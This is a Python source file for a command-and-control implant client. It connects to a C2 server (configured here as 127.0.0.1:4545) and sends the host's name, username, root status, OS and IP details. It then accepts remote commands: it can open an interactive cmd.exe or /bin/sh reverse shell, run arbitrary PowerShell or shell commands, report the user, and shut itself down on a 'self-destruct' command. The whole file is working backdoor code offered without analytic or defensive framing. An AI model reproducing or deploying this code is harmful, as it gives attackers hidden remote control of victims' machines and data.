import socket
import subprocess
import sys
import threading
import os
import time
import signal
import psutil
import platform
import getpass

exit_event = threading.Event()

# Flags to detect environment
IS_WINDOWS = (platform.system().lower() == "windows")

# On Linux, we have a PTY-based interactive shell approach
# On Windows, we do a simpler "read/write loop" approach for interactive mode.

################################################################################
# Windows: Helper function to spawn cmd.exe in interactive style
################################################################################
def windows_interactive_shell(c2_client):
    """
    Spawns cmd.exe (or a Windows interactive shell) using Popen in text mode with line buffering.
    Reads input from the C2 server and writes it to the shell; writes shell output back to the server.
    This updated version flushes the input and adds a tiny delay to help ensure commands are processed immediately.
    """
    try:
        proc = subprocess.Popen(
            ["cmd.exe"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True,
            text=True,    # Use text mode so that we can work with strings directly.
            bufsize=1     # Line-buffered mode
        )

        def write_to_proc():
            while not exit_event.is_set():
                try:
                    data = c2_client.recv(4096)
                    if not data:
                        break
                    # Decode and trim any extra newlines; then add exactly one newline.
                    line = data.decode("UTF-8", errors="ignore").rstrip("\r\n")
                    line += "\n\n"
                    proc.stdin.write(line)
                    proc.stdin.flush()
                    # Optionally add a short delay to help with processing speed.
                    time.sleep(0.1)
                except Exception as e:
                    print(f"[WinShell] Error writing to process: {e}")
                    break

        def read_from_proc():
            while not exit_event.is_set():
                try:
                    output = proc.stdout.readline()
                    if not output:
                        break
                    c2_client.sendall(output.encode("UTF-8", errors="ignore"))
                except Exception as e:
                    print(f"[WinShell] Error reading from process: {e}")
                    break

        threading.Thread(target=write_to_proc, daemon=True).start()
        threading.Thread(target=read_from_proc, daemon=True).start()

        proc.wait()
    except Exception as e:
        c2_client.sendall(f"[WinShell] Could not spawn cmd.exe: {e}\n".encode("UTF-8"))
################################################################################
# Linux: PTY-based interactive shell
################################################################################
def read_shell_output_linux(master_fd, c2_client):
    """
    Continuously reads from the PTY master_fd (Linux) in small chunks,
    sending everything to c2_client.
    """
    while not exit_event.is_set():
        try:
            output = os.read(master_fd, 128)
            if not output:
                break
            c2_client.send(output)
        except Exception as e:
            c2_client.send(f"Error reading shell output: {e}\n".encode("UTF-8"))
            break

def spawn_interactive_shell_linux(c2_client):
    import pty
    try:
        master_fd, slave_fd = pty.openpty()
        shell_proc = subprocess.Popen(
            "/bin/sh",
            shell=True,
            stdin=slave_fd,
            stdout=slave_fd,
            stderr=slave_fd,
            close_fds=True
        )
        os.close(slave_fd)
        # read shell output in a thread
        threading.Thread(target=read_shell_output_linux, args=(master_fd, c2_client), daemon=True).start()

        # read input from server, write to shell
        while shell_proc.poll() is None and not exit_event.is_set():
            data = c2_client.recv(4096)
            if not data:
                break
            os.write(master_fd, data)
    except Exception as e:
        msg = f"Error spawning interactive shell (Linux): {e}\n"
        c2_client.send(msg.encode("UTF-8"))

################################################################################
# The main receiver that processes commands
################################################################################
def c2_receiver(c2_client):
    """
    Receives commands from the C2 server and handles them.
    On Windows, if "start_shell" is invoked, we spawn cmd.exe.
    On Linux, if "start_shell" is invoked, we do a PTY-based bash approach.
    If we see "powershell:" prefix on Windows, we run powershell.exe once and send the output.
    """
    shell_active = False

    while not exit_event.is_set():
        try:
            data = c2_client.recv(4096)
            if not data:
                break
        except Exception as e:
            print("C2 server connection error:", e)
            c2_client.close()
            break

        line = data.decode("UTF-8", errors="ignore").strip()
        if not line:
            continue

        # Powershell command prefix (only if Windows)
        if IS_WINDOWS and line.lower().startswith("powershell:"):
            ps_cmd = line[len("powershell:"):].strip()
            print(f"[PS] Running PowerShell command: {ps_cmd}")
            try:
                proc = subprocess.Popen(
                    ["powershell.exe", ps_cmd],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    shell=False  # no shell here, we pass the cmd as argument to powershell.exe
                )
                out, err = proc.communicate()
                combined = (out or b"") + (err or b"")
                c2_client.sendall(b"[PS Output]\n" + combined)
            except Exception as e:
                c2_client.sendall(f"[PS Error] {e}\n".encode("UTF-8"))
            continue

        # Start shell logic
        if line.startswith("start_shell"):
            if shell_active:
                c2_client.sendall(b"Shell already active.\n")
                continue
            # Not shell_active yet, let's spawn interactive
            shell_active = True
            c2_client.sendall(b"Initializing interactive shell...\n")

            if IS_WINDOWS:
                # spawn cmd.exe in a separate thread
                threading.Thread(target=windows_interactive_shell, args=(c2_client,), daemon=True).start()
                c2_client.sendall(b"Windows interactive shell started.\n")
            else:
                # spawn PTY-based shell on Linux
                threading.Thread(target=spawn_interactive_shell_linux, args=(c2_client,), daemon=True).start()
                c2_client.sendall(b"Linux interactive shell started.\n")
            continue

        # If an interactive shell is already active on Windows, the windows_interactive_shell
        # thread is reading from c2_client. So we do nothing more here.
        # On Linux, spawn_interactive_shell_linux is also reading from c2_client in a loop.

        # If we see "self-destruct", we close
        if line.startswith("self-destruct"):
            c2_client.close()
            exit_event.set()
            break

        # Otherwise, do a basic command approach. e.g. c0mm@nd style or direct shell
        # For example, "c0mm@nd: ipconfig" ...
        if line.startswith("c0mm@nd"):
            # parse out the command
            parts = line.split("\n", 1)
            cmd = parts[1].strip() if len(parts) > 1 else ""
            try:
                # If Windows, do "cmd /c", else do shell=True with bash
                if IS_WINDOWS:
                    proc = subprocess.Popen(
                        ["cmd.exe", "/c", cmd], 
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE,
                        shell=False
                    )
                else:
                    proc = subprocess.Popen(cmd, shell=True,
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)

                out, err = proc.communicate()
                combined = (out or b"") + (err or b"")
                c2_client.sendall(b"[Cmd Output]\n" + combined)
            except Exception as e:
                c2_client.sendall(f"[Cmd Error] {e}\n".encode("UTF-8"))
            continue

        # Possibly handle other commands, e.g. "whoami" ...
        if line.startswith("whoami"):
            try:
                if IS_WINDOWS:
                    user = os.getlogin()
                else:
                    user = getpass.getuser()
                c2_client.sendall(user.encode("UTF-8"))
            except Exception as e:
                c2_client.sendall(f"[whoami error] {e}".encode("UTF-8"))
            continue

        # etc. If none matched, just print
        print("[Received command]:", line)

    c2_client.close()
    exit_event.set()

################################################################################
# The main
################################################################################
def main():
    # Gather system info to send to the server
    import subprocess
    import getpass

    is_root = (os.name != "nt" and os.getuid() == 0)  # on windows, no getuid
    try:
        ipinfo = subprocess.run("hostname -I",
                                shell=True, capture_output=True, text=True)
        ipaddrinfo = ipinfo.stdout.strip()
    except:
        ipaddrinfo = "No IP address info"

    if not IS_WINDOWS:
        os_info = subprocess.run("uname -a", shell=True, capture_output=True, text=True).stdout.strip()
    else:
        os_info = subprocess.run("systeminfo | findstr /B /C:'OS Name' /C:'OS Version'",shell=True,capture_output=True,text=True).stdout.strip()

    hostname = os.environ.get("COMPUTERNAME") if IS_WINDOWS else os.uname().nodename
    username = getpass.getuser()

    info = (
        f"{hostname}\\{username}\n"
        f"[Root]: {is_root}\n"
        "Domain Joined: Not Applicable\n"
        f"OS info: {os_info}\n"
        f"IP address info: {ipaddrinfo}"
    )

    c2_host = "127.0.0.1"
    c2_port = 4545

    c2_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        c2_client.connect((c2_host, c2_port))
    except Exception as e:
        print("Error connecting to C2 server:", e)
        sys.exit(0)

    # Send machine name or info as the first line
    c2_client.send(info.encode("UTF-8"))

    # Start the receiver thread
    threading.Thread(target=c2_receiver, args=(c2_client,), daemon=True).start()

    # Keep running until exit_event is set
    while not exit_event.is_set():
        time.sleep(1)
    print("[*] Exiting client gracefully.")

if __name__ == "__main__":
    main()
